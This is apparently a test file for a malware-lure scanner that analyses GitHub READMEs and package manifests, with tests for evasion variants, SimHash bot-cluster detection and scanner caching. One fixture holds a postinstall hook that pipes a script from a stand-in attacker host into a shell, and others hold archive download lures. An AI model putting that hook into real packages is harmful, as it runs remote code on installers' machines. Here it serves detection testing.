import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  analyzeManifest,
  analyzeReadme,
  analyzeReadmeAsync,
  engineInfo,
  isNativeLoaded,
  loadRulesDir,
  readmeTraits,
  simhashDistance,
} from '../src/services/security-engine.js';
import { analyzeCampaignClusters } from '../src/services/cluster-analyzer.js';
import { createReadmeScanner, fetchReadme } from '../src/services/readme-scan.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '../..');
const GOLDEN = JSON.parse(fs.readFileSync(path.join(ROOT, 'benchmarks/fixtures/golden.json'), 'utf8'));

test('Rust NAPI-RS 네이티브 엔진이 로드되고 외부 YAML 룰셋 메타데이터를 노출한다', () => {
  assert.equal(isNativeLoaded(), true);
  const info = engineInfo();
  assert.equal(info.backend, 'rust-napi');
  assert.equal(info.ruleVersion, 4);
  assert.equal(info.rulesetId, 'trendar-default-v4');
  assert.match(info.rulesetHash, /^[0-9a-f]{16}$/);
});

test('외부 YAML 룰셋 디렉터리 로드 및 잘못된 경로 에러 격리(Silent Failure 금지)', () => {
  const loaded = loadRulesDir(path.join(ROOT, 'rules'));
  assert.equal(loaded.ruleVersion, 4);
  assert.throws(() => loadRulesDir(path.join(ROOT, 'non-existent-rules-dir')), /failed to load ruleset/);
});

test('Golden Suite: 정상·기준선 악성·17개 우회 변형 전수 일치 (FP 0, FN 0)', () => {
  for (const c of GOLDEN.readme_cases) {
    const report = analyzeReadme(c.readme, c.repo);
    assert.equal(
      report.verdict,
      c.expected,
      `case=${c.id} category=${c.category} expected=${c.expected} actual=${report.verdict} score=${report.score} signals=${JSON.stringify(report.signals)}`,
    );
  }
});

test('Golden Traits: Markdown 참조형 링크 해결 및 SimHash 주석/태그 변형 퍼지 군집 탐지', () => {
  const refCase = GOLDEN.traits_cases.find((c) => c.id === 'evasion-ref-link-filehost');
  const t = readmeTraits(refCase.readme, refCase.repo);
  assert.equal(t.lure, true);
  assert.equal(t.archiveFilehostUrl, 'https://mega.nz/file/AbC#key');

  const fuzzyCase = GOLDEN.traits_cases.find((c) => c.id === 'evasion-fuzzy-simhash-comment-mutation');
  const a = readmeTraits(fuzzyCase.readme_a, fuzzyCase.repo_a);
  const b = readmeTraits(fuzzyCase.readme_b, fuzzyCase.repo_b);
  assert.ok(a.simhash && b.simhash);
  const dist = simhashDistance(a.simhash, b.simhash);
  assert.ok(dist !== null && dist <= 5, `expected simhash distance <= 5, got ${dist}`);
});

test('SimHash 퍼지 군집 및 군집 오염 방어(원본 정상 저장소 보호)', () => {
  const fuzzyCase = GOLDEN.traits_cases.find((c) => c.id === 'evasion-fuzzy-simhash-comment-mutation');
  const a = readmeTraits(fuzzyCase.readme_a, fuzzyCase.repo_a);
  const b = readmeTraits(fuzzyCase.readme_b, fuzzyCase.repo_b);
  const c = readmeTraits(`${fuzzyCase.readme_b}\nTag: v2.0.2`, { owner: 'owner3', name: 'manus-three' });

  const res = analyzeCampaignClusters([
    {
      github_id: 100,
      owner_login: 'established-oss',
      text_key: a.textKey,
      skeleton_key: a.skeletonKey,
      simhash: a.simhash,
      lure: true,
      direct_malicious: false,
      language: 'TypeScript',
      forks: 42,
      repo_age_days: 180,
    },
    {
      github_id: 101,
      owner_login: 'bot-acct-1',
      text_key: b.textKey,
      skeleton_key: b.skeletonKey,
      simhash: b.simhash,
      lure: true,
      direct_malicious: false,
      language: null,
      forks: 0,
      repo_age_days: 2,
    },
    {
      github_id: 102,
      owner_login: 'bot-acct-2',
      text_key: c.textKey,
      skeleton_key: c.skeletonKey,
      simhash: c.simhash,
      lure: true,
      direct_malicious: false,
      language: null,
      forks: 0,
      repo_age_days: 1,
    },
  ]);

  assert.deepEqual(res.protected_origin_ids, [100]);
  assert.deepEqual(res.hidden_ids.sort((x, y) => x - y), [101, 102]);
});

test('비블로킹 NAPI-RS AsyncTask 분석(analyzeReadmeAsync)이 동기 결과와 동일하다', async () => {
  const sample = GOLDEN.readme_cases.find((c) => c.id === 'evasion-01-ps-backtick');
  const [syncRes, asyncRes] = await Promise.all([
    Promise.resolve(analyzeReadme(sample.readme, sample.repo)),
    analyzeReadmeAsync(sample.readme, sample.repo),
  ]);
  assert.equal(asyncRes.verdict, syncRes.verdict);
  assert.equal(asyncRes.score, syncRes.score);
  assert.equal(asyncRes.verdict, 'malicious');
});

test('Opt-in 매니페스트 정적 분석(기본 OFF, 명시 호출 시 악성 훅·VSCode 자동실행·바이너리 미끼 트리 탐지)', () => {
  for (const mc of GOLDEN.manifest_opt_in_cases) {
    const res = analyzeManifest({ files: mc.files ?? [], tree: mc.tree ?? [] });
    assert.equal(res.verdict, mc.expected, `manifest case=${mc.id} got=${JSON.stringify(res)}`);
  }
  // 손상된 JSON 입력에도 크래시 없이 안전하게 clean 반환
  const broken = analyzeManifest({ files: [{ path: 'package.json', content: '{not-valid-json' }], tree: [] });
  assert.equal(broken.verdict, 'clean');
});

test('스캐너 I/O 개선: 동일 소유자 계정 조회 캐싱·Opt-in 매니페스트 기본 OFF·타임아웃 격리', async () => {
  const dropboxReadme = '# Manus\n[Download](https://www.dropbox.com/s/1/App.rar?dl=1)\n';
  let ownerCalls = 0;
  let manifestCalls = 0;
  const saved = [];
  const baseModel = {
    findVerdicts: async () => new Map(),
    upsertVerdict: async (row) => saved.push(row),
    refreshClusters: async () => 0,
  };

  const scanner = createReadmeScanner({
    model: baseModel,
    fetchReadme: async () => dropboxReadme,
    fetchOwnerCreatedAt: async () => {
      ownerCalls++;
      return new Date('2026-11-01T00:00:00Z');
    },
    fetchManifest: async () => {
      manifestCalls++;
      return { files: [{ path: 'package.json', content: '{"scripts":{"postinstall":"curl https://evil.cc/a.sh | sh"}}' }] };
    },
    now: () => new Date('2026-11-15T00:00:00Z'),
    minIntervalMs: 0,
    concurrency: 1,
    log: { warn() {} },
  });

  await scanner.scanRepos({}, [
    { github_id: 1, owner: 'SameBot', name: 'r1', pushed_at: '2026-11-14T00:00:00Z', language: null, forks: 0, size: 5 },
    { github_id: 2, owner: 'samebot', name: 'r2', pushed_at: '2026-11-14T00:00:00Z', language: null, forks: 0, size: 5 },
  ]);

  assert.equal(ownerCalls, 1, '동일 소유자 계정은 실행당 1회만 조회');
  assert.equal(manifestCalls, 0, '매니페스트 분석은 기본 OFF');
  assert.equal(saved.filter((r) => r.verdict === 'malicious').length, 2);

  // fetchReadme 타임아웃 격리 검증
  const hangingOctokit = {
    rest: { repos: { getReadme: () => new Promise(() => {}) } },
  };
  await assert.rejects(fetchReadme(hangingOctokit, 'o', 'r', { timeoutMs: 30 }), { code: 'README_FETCH_TIMEOUT' });
});
